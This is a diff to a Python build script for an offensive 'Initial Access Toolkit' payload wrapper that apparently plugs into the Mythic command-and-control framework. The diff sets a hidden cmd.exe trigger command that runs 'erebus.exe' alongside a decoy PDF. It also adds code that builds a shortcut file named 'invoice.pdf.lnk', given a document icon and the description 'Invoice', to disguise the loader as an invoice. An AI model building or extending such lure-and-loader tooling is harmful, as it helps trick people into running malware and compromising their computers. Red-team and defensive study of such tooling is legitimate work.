@@ -86,7 +86,7 @@ class ErebusWrapper(PayloadType):
     name = "erebus_wrapper"
     author = "@Lavender-exe, @hunterino-sec"
     semver = "v0.0.1"
-    note = f"An Initial Access Toolkit."
+    note = f"An Initial Access Toolkit aimed to speed up IA development.\nVersion: {semver}"
 
     file_extension = "zip"
     supported_os = [
@@ -156,7 +156,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
             name = "0.3 ClickOnce Build Configuration",
             parameter_type = BuildParameterType.ChooseOne,
             description = "Select the loader's build config.",
-            choices = ["debug", "release", "publish"],
+            choices = ["debug", "release"],
             default_value = "debug",
             hide_conditions = [
                 HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.NotEQ, value="ClickOnce"),
@@ -237,7 +237,7 @@ enumdesktops = EnumDesktops callback injection (self)""",
             name = "0.9 Trigger Command",
             parameter_type = BuildParameterType.String,
             description = "Choose a command to run when the trigger is executed.",
-            default_value = "--headless cmd.exe /Q /c payload.exe | decoy.pdf",
+            default_value = "--headless cmd.exe /Q /c erebus.exe | decoy.pdf",
             hide_conditions = [
                 HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
             ]
@@ -1244,7 +1244,6 @@ generated if none have been entered.""",
                     output = ""
 
             ######################### End Of Shellcode Loader Section #########################
-
             ######################### Code Signing Section #########################
             if self.get_parameter("6.0 Codesign Loader"):
                 try:
@@ -1375,7 +1374,49 @@ generated if none have been entered.""",
                         StepSuccess=True
                     ))
             ######################### End of Decoy Section #########################
+            ######################### LNK Trigger Section #########################
+            if self.get_parameter("0.0 Main Payload Type") == "Loader":
+                try:
+                    payload_dir = Path(agent_build_path) / "payload"
+                    
+                    # Create LNK trigger file
+                    lnk_path = create_payload_trigger(
+                        target_bin = str(self.get_parameter("0.8 Trigger Binary")),
+                        args = str(self.get_parameter("0.9 Trigger Command")),
+                        icon_src = r"C:\Windows\System32\imageres.dll",
+                        icon_index = 0,
+                        description = "Invoice",
+                    )
+                    
+                    # Move invoice.pdf.lnk to payload directory
+                    lnk_source = Path(lnk_path)
+                    lnk_destination = payload_dir / "invoice.pdf.lnk"
+                    if lnk_source.exists():
+                        shutil.move(str(lnk_source), str(lnk_destination))
+                        lnk_path = str(lnk_destination)
+                    
+                    response.status = BuildStatus.Success
+                    response.build_message = "LNK Trigger created!"
+                    await SendMythicRPCPayloadUpdatebuildStep(
+                        MythicRPCPayloadUpdateBuildStepMessage(
+                        PayloadUUID=self.uuid,
+                        StepName="Adding Trigger",
+                        StepStdout=f"LNK Trigger created at: {lnk_path}",
+                        StepSuccess=True,
+                    ))
+                except Exception as e:
+                    response.status = BuildStatus.Error
+                    response.build_message = f"Failed to create LNK trigger: {str(e)}"
+                    await SendMythicRPCPayloadUpdatebuildStep(
+                        MythicRPCPayloadUpdateBuildStepMessage(
+                        PayloadUUID=self.uuid,
+                        StepName="Adding Trigger",
+                        StepStdout=f"Failed to create LNK trigger: {str(e)}",
+                        StepSuccess=False,
+                    ))
+                    return response
 
+            ######################### End Of  LNK Trigger Section #########################
             ######################### Final Payload / Container #########################
 
             # 1. Capture context for container function
